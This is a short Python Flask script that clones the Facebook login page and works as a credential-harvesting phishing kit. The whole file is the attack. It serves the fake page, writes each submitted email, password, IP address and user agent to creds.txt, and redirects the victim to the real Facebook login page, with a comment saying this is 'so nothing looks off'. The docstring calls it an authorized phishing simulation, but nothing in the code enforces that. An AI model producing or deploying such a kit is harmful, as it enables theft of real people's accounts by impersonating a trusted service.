#!/usr/bin/env python3
"""
Authorized phishing-simulation artifact.
Run:  python3 fb_clone.py  ->  http://0.0.0.0:8000/
Captured creds are appended to creds.txt.
"""
from datetime import datetime
from pathlib import Path

from flask import Flask, request, redirect, Response

app = Flask(__name__)
LOG = Path(__file__).with_name("creds.txt")

PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Facebook - log in or sign up</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;font-family:Helvetica,Arial,sans-serif}
  body{background:#f0f2f5;display:flex;flex-direction:column;align-items:center;padding-top:80px}
  .wrap{display:flex;gap:80px;align-items:flex-start;max-width:980px}
  .left{width:380px;padding-top:40px}
  .logo{color:#1877f2;font-size:56px;font-weight:800;letter-spacing:-2px;margin-bottom:10px}
  .tagline{font-size:24px;line-height:28px;color:#1c1e21}
  .card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px}
  input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:12px}
  input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
  .login{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;padding:12px;cursor:pointer}
  .login:hover{background:#166fe5}
  .forgot{display:block;text-align:center;color:#1877f2;font-size:14px;margin:16px 0;text-decoration:none}
  .divider{border-bottom:1px solid #dadde1;margin:20px 16px}
  .new{display:block;margin:0 auto;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;padding:12px 16px;cursor:pointer}
  .new:hover{background:#36a420}
  .below{text-align:center;font-size:14px;margin-top:28px;color:#1c1e21}
  .below b{font-weight:700}
  @media(max-width:900px){.wrap{flex-direction:column;gap:20px;align-items:center}.left{text-align:center;width:auto;padding-top:0}.logo{font-size:44px}}
</style>
</head>
<body>
  <div class="wrap">
    <div class="left">
      <div class="logo">facebook</div>
      <div class="tagline">Connect with friends and the world around you on Facebook.</div>
    </div>
    <div class="card">
      <form id="loginForm" method="POST" action="/login">
        <input type="text" name="email" placeholder="Email or phone number" autocomplete="username" required>
        <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
        <button type="submit" class="login">Log In</button>
      </form>
      <a class="forgot" href="#">Forgot password?</a>
      <div class="divider"></div>
      <button class="new" type="button">Create New Account</button>
    </div>
  </div>
  <div class="below"><b>Create a Page</b> for a celebrity, brand or business.</div>
</body>
</html>"""


@app.route("/")
def index():
    return Response(PAGE, mimetype="text/html")


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")

    line = f"[{datetime.now().isoformat()}] ip={ip} email={email} pass={password} ua={ua}\n"
    with LOG.open("a", encoding="utf-8") as fh:
        fh.write(line)

    # Send the target to the real site so nothing looks off.
    return redirect("https://www.facebook.com/login", code=302)


if __name__ == "__main__":
    print(f"[*] Credentials will be written to: {LOG}")
    print("[*] Serving on http://0.0.0.0:8000/")
    app.run(host="0.0.0.0", port=8000)
